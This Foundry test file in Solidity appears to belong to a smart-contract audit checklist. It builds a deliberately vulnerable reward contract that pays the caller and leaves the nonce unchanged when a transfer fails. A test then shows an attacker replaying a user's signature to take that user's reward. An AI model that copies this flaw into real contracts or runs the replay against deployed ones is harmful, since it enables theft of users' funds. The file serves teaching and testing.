// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/access/Ownable.sol";

/**
 * Overview:
 * Checklist Item ID: SOL-AM-ReplayAttack-1
 *
 * This test demonstrates a replay attack vulnerability in a reward claiming system.
 * The RewardSystem contract lacks proper signature invalidation, allowing an attacker
 * to replay a user's signature and steal their rewards after the contract is funded.
 */
contract RewardSystem is Ownable {
    mapping(address => uint256) public rewards;
    mapping(address => uint256) public nonces;

    constructor() Ownable(msg.sender) {}

    // For PoC simplicity, we don't use real signatures
    function claimReward(address user, uint256 amount, uint256 nonce, bytes memory signature) external {
        require(rewards[user] >= amount, "Insufficient reward balance");
        require(nonces[user] == nonce, "Invalid nonce");

        // Vulnerability: Signature can be replayed once contract has funds
        bytes32 messageHash = keccak256(abi.encode(
            user,
            amount,
            nonce
        ));

        // For PoC, use a simple signature check
        bytes32 signedHash = abi.decode(signature, (bytes32));
        require(signedHash == messageHash, "Invalid signature");

        // Attempt to transfer reward
        rewards[user] -= amount;
        (bool success,) = msg.sender.call{value: amount}("");

        // Vulnerability: Nonce is only incremented if transfer succeeds
        if (success) {
            nonces[user]++;
        } else {
            // Revert the reward deduction if transfer failed
            rewards[user] += amount;
            revert("Transfer failed");
        }
    }

    // Helper function to add rewards - only owner can call
    function addReward(address user, uint256 amount) external onlyOwner {
        rewards[user] += amount;
    }

    // Helper function to receive ETH
    receive() external payable {}
}

contract ReplayAttackTest is Test {
    RewardSystem public rewardSystem;
    address public user;
    address public attacker;
    uint256 constant REWARD_AMOUNT = 1 ether;

    function setUp() public {
        vm.startPrank(address(this));
        rewardSystem = new RewardSystem();
        user = address(1);
        attacker = address(2);

        // Setup initial reward for user
        rewardSystem.addReward(user, REWARD_AMOUNT);
        vm.stopPrank();
    }

    function testReplayAttack() public {
        uint256 nonce = rewardSystem.nonces(user);

        // 1. Create a signature for claiming reward
        bytes32 messageHash = keccak256(abi.encode(
            user,
            REWARD_AMOUNT,
            nonce
        ));

        // For PoC, use the hash directly as the signature
        bytes memory signature = abi.encode(messageHash);

        // 2. User attempts to claim but fails due to no ETH in contract
        vm.prank(user);
        vm.expectRevert("Transfer failed");
        rewardSystem.claimReward(user, REWARD_AMOUNT, nonce, signature);

        // Verify nonce didn't increment due to failed transfer
        assertEq(rewardSystem.nonces(user), nonce);

        // 3. Contract receives ETH
        vm.deal(address(rewardSystem), REWARD_AMOUNT);

        // 4. Attacker replays the signature to steal rewards
        vm.prank(attacker);
        rewardSystem.claimReward(user, REWARD_AMOUNT, nonce, signature);

        // 5. Verify the attack succeeded
        assertEq(address(attacker).balance, REWARD_AMOUNT);
        assertEq(rewardSystem.rewards(user), 0);
        assertEq(rewardSystem.nonces(user), nonce + 1);
    }
}
